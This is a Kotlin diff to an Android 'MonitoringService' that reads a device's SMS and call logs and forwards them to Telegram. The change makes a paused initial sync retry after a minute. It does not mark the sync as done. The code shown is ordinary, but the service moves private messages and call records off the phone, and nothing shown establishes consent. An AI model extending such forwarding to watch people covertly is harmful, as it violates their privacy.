@@ -5433,11 +5433,15 @@ class MonitoringService : Service() {
             }
             val pausedAtTail = try { preferencesManager.monitoringPaused } catch (_: Exception) { false }
             if (initialOk && !smsReadFailed && !callReadFailed && !smsTruncated && !callTruncated) {
-                if (!pausedAtTail) sendToTelegram(completeMessage)
-                initialSyncRetryAt = 0L
-                initialStartSent = false
-                initialPartialNotified = false
-                preferencesManager.setInitialSyncDoneSync(true)
+                if (pausedAtTail) {
+                    initialSyncRetryAt = android.os.SystemClock.elapsedRealtime() + 60_000L
+                } else {
+                    sendToTelegram(completeMessage)
+                    initialSyncRetryAt = 0L
+                    initialStartSent = false
+                    initialPartialNotified = false
+                    preferencesManager.setInitialSyncDoneSync(true)
+                }
             } else {
                 initialSyncRetryAt = android.os.SystemClock.elapsedRealtime() + 30 * 60_000L
                 if (!pausedAtTail && !initialPartialNotified) {
